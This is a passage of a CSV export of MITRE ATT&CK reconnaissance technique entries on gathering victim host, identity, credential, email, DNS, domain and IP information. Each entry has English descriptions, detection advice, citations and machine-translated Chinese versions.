Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1592,,,,,,,,,",",收集受害者主机信息：固件,攻击者可能会收集有关受害者主机固件的信息，这些信息可以在定位期间使用。有关主机固件的信息可能包括各种详细信息，例如特定主机上的类型和版本，这些信息可用于推断有关环境中主机的更多信息（例如：配置、用途、年龄/补丁级别等）。攻击者可以通过各种方式收集这些信息，例如通过 [Phishing for Information] (https://attack.mitre.org/techniques/T1598) 直接获取信息。有关主机固件的信息只能通过在线或其他可访问的数据集（例如：职位发布、网络地图、评估报告、简历或购买发票）暴露给对手。（引用：ArsTechnica Intel）收集此信息可能会为其他人提供机会侦察形式（例如：[搜索开放网站/域]（https://attack.mitre.org/techniques/T1593）或[搜索开放技术数据库]（https://attack.mitre.org/techniques/T1596） )，建立运营资源（例如：[Develop Capabilities](https://attack.mitre.org/techniques/T1587) 或 [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)），以及/ 或初始访问（例如：[供应链妥协](https://attack.mitre.org/techniques/T1195) 或 [利用面向公众的应用程序](https://attack.mitre.org/techniques/T1190) ）。
T1592.001,Gather Victim Host Information: Hardware,"Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: hostnames, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).",https://attack.mitre.org/techniques/T1592/001,02 October 2020,17 October 2021,1.1,Reconnaissance,"Internet scanners may be used to look for patterns associated with malicious content designed to collect host hardware information from visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,Internet Scan: Response Content,True,T1592,,,,,,,,,",",收集受害者主机信息：硬件,攻击者可能会收集有关可在定位期间使用的受害者主机硬件的信息。有关硬件基础设施的信息可能包括各种详细信息，例如特定主机上的类型和版本，以及可能表明增加了防御性保护的其他组件的存在（例如：卡/生物识别阅读器、专用加密硬件等） .攻击者可以通过各种方式收集这些信息，例如通过 [主动扫描](https://attack.mitre.org/techniques/T1595) （例如：主机名、服务器横幅、用户代理字符串）或 [网络钓鱼信息](https://attack.mitre.org/techniques/T1598)。攻击者还可能破坏网站，然后包含旨在从访问者那里收集主机信息的恶意内容。（引文：ATT ScanBox）有关硬件基础设施的信息也可能通过在线或其他可访问的数据集（例如：招聘信息、网络地图、评估报告、简历或采购发票）。收集这些信息可能会揭示其他形式的侦察机会（例如：[搜索开放网站/域](https://attack.mitre.org/techniques/T1593) 或[搜索开放技术数据库](https://attack. mitre.org/techniques/T1596)），建立运营资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587) 或[获得能力](https://attack.mitre.org /techniques/T1588)）和/或初始访问权限（例如：[妥协硬件供应链](https://attack.mitre.org/techniques/T1195/003) 或[硬件添加](https://attack. mitre.org/techniques/T1200))。
T1592.002,Gather Victim Host Information: Software,"Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or for initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1592/002,02 October 2020,17 October 2021,1.1,Reconnaissance,"Internet scanners may be used to look for patterns associated with malicious content designed to collect host software information from visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,Internet Scan: Response Content,True,T1592,,,,,,,,,"(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: TrendMicro New Andariel Tactics July 2018),",收集受害者主机信息：软件,攻击者可能会收集有关可在定位期间使用的受害者主机软件的信息。有关已安装软件的信息可能包括各种详细信息，例如特定主机上的类型和版本，以及是否存在可能表明增加了防御性保护的其他组件（例如：防病毒、SIEM 等）。攻击者可以通过多种方式收集这些信息，例如通过 [主动扫描](https://attack.mitre.org/techniques/T1595) 直接收集操作（例如：监听端口、服务器横幅、用户代理字符串）或 [网络钓鱼信息](https://attack.mitre.org/techniques/T1598)。攻击者还可能破坏网站，然后包含旨在从访问者那里收集主机信息的恶意内容。（引用：ATT ScanBox）有关已安装软件的信息也可能通过在线或其他可访问的数据集（例如：招聘信息、网络地图、评估报告、简历或采购发票）。收集这些信息可能会揭示其他形式的侦察机会（例如：[搜索开放网站/域](https://attack.mitre.org/techniques/T1593) 或[搜索开放技术数据库](https://attack. mitre.org/techniques/T1596)），建立运营资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587) 或[获得能力](https://attack.mitre.org /techniques/T1588)）和/或用于初始访问（例如：[供应链妥协](https://attack.mitre.org/techniques/T1195) 或 [外部远程服务](https://attack.mitre .org/techniques/T1133))。
T1589,Gather Victim Identity Information,"Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, etc.) as well as sensitive details such as credentials.

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about users could also be enumerated via other active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.(Citation: GrimBlog UsernameEnum) Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks)

Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",https://attack.mitre.org/techniques/T1589,02 October 2020,21 April 2022,1.2,Reconnaissance,"Monitor for suspicious network traffic that could be indicative of probing for user information, such as large/iterative quantities of authentication requests originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Content",False,,,"Jannie Li, Microsoft Threat Intelligence Center (MSTIC)",,,,,,,"(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Proofpoint TA453 July2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: FoxIT Wocao December 2019),(Citation: MSTIC DEV-0537 Mar 2022),",收集受害者身份信息,攻击者可能会收集有关受害者身份的信息，这些信息可以在定位期间使用。有关身份的信息可能包括各种详细信息，包括个人数据（例如：员工姓名、电子邮件地址等）以及凭据等敏感详细信息。攻击者可以通过各种方式收集这些信息，例如通过 [Phishing for Information] (https://attack.mitre.org/techniques/T1598) 直接获取信息。有关用户的信息也可以通过其他主动方式（即[主动扫描]（https://attack.mitre.org/techniques/T1595））进行枚举，例如探测和分析来自身份验证服务的响应，这些响应可能会揭示系统中的有效用户名.（引用：GrimBlog UsernameEnum）有关受害者的信息也可能通过在线或其他可访问的数据集（例如：[社交媒体]（https://attack.mitre.org/techniques/T1593/001）或[搜索受害者拥有的网站]（https://attack.mitre.org/techniques/T1594））。（引文：OPM Leak）（引文：注册德勤）（引文：注册优步）（引文：Detectify Slack Tokens）（引文： Forbes GitHub Creds）（引用：GitHub truffleHog）（引用：GitHub Gitrob）（引用：CNET Leaks）收集此信息可能会揭示其他形式的侦察机会（例如：[搜索开放网站/域]（https://attack. mitre.org/techniques/T1593) 或 [Phishing for Information](https://attack.mitre.org/techniques/T1598))，建立运营资源（例如：[Compromise Accounts](https://attack.mitre.org/techniques/T1586)）和/或初始访问权限（例如：[Phishing](https://attack.mitre.org/techniques/ T1566) 或 [有效帐户](https://attack.mitre.org/techniques/T1078))。
T1589.001,Gather Victim Identity Information: Credentials,"Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.

Adversaries may gather credentials from potential victims in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect website authentication cookies from visitors.(Citation: ATT ScanBox) Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: [Search Engines](https://attack.mitre.org/techniques/T1593/002), breach dumps, code repositories, etc.).(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Adversaries may also purchase credentials from dark web or other black-markets. Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",https://attack.mitre.org/techniques/T1589/001,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1589,,"Lee Christensen, SpecterOps; Toby Kohlenberg; Vinayak Wadhwa, Lucideus",,,,,,,"(Citation: NCC Group Chimera January 2021),(Citation: IBM ITG18 2020),(Citation: Microsoft Targeting Elections September 2020),(Citation: CrowdStrike StellarParticle January 2022),(Citation: CISA AA21-200A APT40 July 2021),(Citation: MSTIC DEV-0537 Mar 2022),",收集受害者身份信息：凭证,攻击者可能会收集可在定位期间使用的凭据。攻击者收集的帐户凭据可能是与目标受害者组织直接相关的帐户凭据，或者试图利用用户在个人和企业帐户中使用相同密码的趋势。攻击者可以通过各种方式从潜在受害者那里收集凭据，例如通过 [Phishing for Information] (https://attack.mitre.org/techniques/T1598) 直接引诱。攻击者还可能破坏网站，然后包含旨在从访问者那里收集网站身份验证 cookie 的恶意内容。（引用：ATT ScanBox）凭据信息也可能通过泄露到在线或其他可访问数据集（例如：[搜索引擎]（https ://attack.mitre.org/techniques/T1593/002），违规转储，代码存储库等）。（引用：注册德勤）（引用：注册优步）（引用：Detectify Slack Tokens）（引用：福布斯GitHub Creds）（引用：GitHub truffleHog）（引用：GitHub Gitrob）（引用：CNET Leaks）攻击者也可能从暗网或其他黑市购买凭据。收集此信息可能会揭示其他形式的侦察机会（例如：[搜索开放网站/域](https://attack.mitre.org/techniques/T1593) 或 [网络钓鱼获取信息](https://attack.mitre .org/techniques/T1598)），建立运营资源（例如：[Compromise Accounts](https://attack.mitre.org/techniques/T1586)）和/或初始访问（例如：[外部远程服务]（ https://attack.mitre.org/techniques/T1133) 或 [有效帐户](https://attack.mitre.org/techniques/T1078))。
T1589.002,Gather Victim Identity Information: Email Addresses,"Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.

Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: HackersArise Email)(Citation: CNET Leaks) Email addresses could also be enumerated via more active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.(Citation: GrimBlog UsernameEnum) For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.(Citation: GitHub Office 365 User Enumeration)(Citation: Azure Active Directory Reconnaisance)

Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Brute Force](https://attack.mitre.org/techniques/T1110) via [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1589/002,02 October 2020,21 October 2022,1.2,Reconnaissance,"Monitor for suspicious network traffic that could be indicative of probing for email addresses and/or usernames, such as large/iterative quantities of authentication requests originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,Network Traffic: Network Traffic Content,True,T1589,,"Jannie Li, Microsoft Threat Intelligence Center (MSTIC)",,,,,,,"(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Azure AD Recon),(Citation: Unit 42 TA551 Jan 2021),(Citation: SecureWorks August 2019),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Anomali Static Kitten February 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Volexity Exchange Marauder March 2021),(Citation: Proofpoint TA453 July2021),(Citation: AADInternals Documentation),(Citation: ClearSky Siamesekitten August 2021),(Citation: DOJ Iran Indictments March 2018),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Google EXOTIC LILY March 2022),",收集受害者身份信息：电子邮件地址,攻击者可能会收集可在定位期间使用的电子邮件地址。即使存在内部实例，组织也可能拥有面向公众的电子邮件基础设施和员工地址。攻击者很容易收集电子邮件地址，因为它们可能很容易通过在线或其他可访问的数据集（例如：[社交媒体]（https://attack.mitre.org/techniques/T1593/001）或[搜索受害者）获得和暴露-拥有的网站](https://attack.mitre.org/techniques/T1594))。(引文：HackersArise 电子邮件)(引文：CNET Leaks) 电子邮件地址也可以通过更主动的方式枚举（即[主动扫描]（ https://attack.mitre.org/techniques/T1595)），例如探测和分析来自身份验证服务的响应，这些响应可能会揭示系统中的有效用户名。（引用：GrimBlog UsernameEnum）例如，攻击者可能能够枚举电子邮件通过查询各种公开可用的 API 终端（例如 autodiscover 和 GetCredentialType）来获取 Office 365 环境中的地址。（引用：GitHub Office 365 用户枚举）（引用：Azure Active Directory 侦察）收集此信息可能会揭示其他形式的侦察机会（例如：[搜索打开网站/域](https://attack.mitre.org/techniques/T1593) 或 [钓鱼信息](https://attack.mitre.org/techniques/T1598))，建立运营资源（例如：[电子邮件帐户](https://attack.mitre.org/techniques/T1586/002)）和/或初始访问权限（例如：[网络钓鱼](https://attack.mitre.org/techniques/T1566) 或 [蛮力]（https://attack.mitre.org/techniques/T1110）通过[外部远程服务]（https://attack.mitre.org/techniques/T1133））。
T1589.003,Gather Victim Identity Information: Employee Names,"Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.

Adversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",https://attack.mitre.org/techniques/T1589/003,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1589,,,,,,,,,"(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: DOJ Iran Indictments March 2018),(Citation: KISA Operation Muzabi),",收集受害者身份信息：员工姓名,攻击者可能会收集可在定位期间使用的员工姓名。员工姓名用于获取电子邮件地址以及帮助指导其他侦察工作和/或制作更可信的诱饵。对手可能很容易收集员工姓名，因为他们可能很容易通过在线或其他可访问的数据集（例如：[社交媒体]（https://attack.mitre.org/techniques/T1593/001）或[搜索受害者-拥有的网站](https://attack.mitre.org/techniques/T1594)。（引用：OPM Leak）收集此信息可能会揭示其他形式的侦察机会（例如：[搜索开放网站/域]（https ://attack.mitre.org/techniques/T1593) 或 [Phishing for Information](https://attack.mitre.org/techniques/T1598))，建立运营资源（例如：[Compromise Accounts](https:// /attack.mitre.org/techniques/T1586)）和/或初始访问权限（例如：[网络钓鱼](https://attack.mitre.org/techniques/T1566) 或 [有效帐户](https://attack .mitre.org/techniques/T1078))。
T1590,Gather Victim Network Information,"Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",https://attack.mitre.org/techniques/T1590,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,False,,,,,,,,,,"(Citation: Volexity Exchange Marauder March 2021),",收集受害者网络信息,攻击者可能会收集有关受害者网络的信息，这些信息可以在定位期间使用。有关网络的信息可能包括各种细节，包括管理数据（例如：IP 范围、域名等）以及有关其拓扑和操作的细节。攻击者可以通过各种方式收集这些信息，例如通过 [主动扫描](https://attack.mitre.org/techniques/T1595) 或 [网络钓鱼获取信息](https://attack.mitre.org) 直接收集信息/技术/T1598）。有关网络的信息也可能通过在线或其他可访问的数据集（例如：[搜索开放技术数据库]（https://attack.mitre.org/techniques/T1596））暴露给攻击者。（引用：WHOIS）（引用： DNS Dumpster）（引用：Circl Passive DNS）收集此信息可能会揭示其他形式的侦察机会（例如：[主动扫描]（https://attack.mitre.org/techniques/T1595）或[搜索开放网站/域](https://attack.mitre.org/techniques/T1593))，建立运营资源（例如：[获取基础设施](https://attack.mitre.org/techniques/T1583) 或 [妥协基础设施](https ://attack.mitre.org/techniques/T1584)）和/或初始访问权限（例如：[受信任的关系](https://attack.mitre.org/techniques/T1199)）。
T1590.002,Gather Victim Network Information: DNS,"Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts. DNS, MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.(Citation: Sean Metcalf Twitter DNS Records)

Adversaries may gather this information in various ways, such as querying or otherwise collecting details via [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001). DNS information may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1590/002,02 October 2020,21 October 2022,1.1,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1590,,"Jannie Li, Microsoft Threat Intelligence Center (MSTIC)",,,,,,,",",收集受害者网络信息：DNS,攻击者可能会收集有关受害者 DNS 的信息，这些信息可以在定位期间使用。 DNS 信息可能包括各种详细信息，包括注册的名称服务器以及概述目标子域、邮件服务器和其他主机地址的记录。 DNS、MX、TXT 和 SPF 记录还可能揭示第三方云和 SaaS 提供商的使用，例如 Office 365、G Suite、Salesforce 或 Zendesk。（引文：Sean Metcalf Twitter DNS 记录）攻击者可能会在各种方式，例如通过 [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001) 查询或以其他方式收集详细信息。 DNS 信息也可能通过在线或其他可访问的数据集（例如：[搜索开放技术数据库]（https://attack.mitre.org/techniques/T1596））暴露给攻击者。（引用：DNS Dumpster）（引用： Circl Passive DNS）收集此信息可能会揭示其他形式的侦察机会（例如：[搜索开放技术数据库]（https://attack.mitre.org/techniques/T1596），[搜索开放网站/域]（https： //attack.mitre.org/techniques/T1593)，或[主动扫描](https://attack.mitre.org/techniques/T1595))，建立运营资源（例如：[获取基础设施](https:// attack.mitre.org/techniques/T1583) 或 [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584))，和/或初始访问权限（例如：[外部远程服务](https:// attack.mitre.org/techniques/T1133))。
T1590.001,Gather Victim Network Information: Domain Properties,"Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: [WHOIS](https://attack.mitre.org/techniques/T1596/002)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments.(Citation: Azure Active Directory Reconnaisance)(Citation: Office 265 Azure Domain Availability) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",https://attack.mitre.org/techniques/T1590/001,02 October 2020,21 October 2022,1.1,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1590,,"Jannie Li, Microsoft Threat Intelligence Center (MSTIC)",,,,,,,"(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Azure AD Recon),(Citation: AADInternals Documentation),",收集受害者网络信息：域属性,攻击者可能会收集有关受害者网络域的信息，这些信息可以在定位期间使用。有关域及其属性的信息可能包括各种详细信息，包括受害者拥有的域以及管理数据（例如：姓名、注册商等）以及更直接的可操作信息，例如联系人（电子邮件地址和电话）号码）、公司地址和名称服务器。攻击者可以通过各种方式收集这些信息，例如通过 [主动扫描](https://attack.mitre.org/techniques/T1595) 或 [网络钓鱼获取信息](https://attack.mitre.org) 直接收集信息/技术/T1598）。有关受害者域及其属性的信息也可能通过在线或其他可访问的数据集（例如：[WHOIS](https://attack.mitre.org/techniques/T1596/002)）暴露给攻击者。（引用：WHOIS） （引用：DNS Dumpster）（引用：Circl Passive DNS）在使用第三方云提供商的情况下，此信息也可能通过公开可用的 API 终端公开，例如 Office 365 环境中的 GetUserRealm 和自动发现。（引用：Azure Active目录侦察）（引用：Office 265 Azure 域可用性）收集此信息可能会揭示其他形式的侦察机会（例如：[搜索开放技术数据库]（https://attack.mitre.org/techniques/T1596），[搜索打开网站/域](https://attack.mitre.org/techniques/T1593)，或[钓鱼信息](https://attack.mitre.org/techniques/T1598))，建立运营资源（例如： [获取基础设施](https://attack.mitre.org/techniques/T1583) 或 [妥协基础设施cture](https://attack.mitre.org/techniques/T1584)）和/或初始访问权限（例如：[网络钓鱼](https://attack.mitre.org/techniques/T1566)）。
T1590.005,Gather Victim Network Information: IP Addresses,"Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1590/005,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

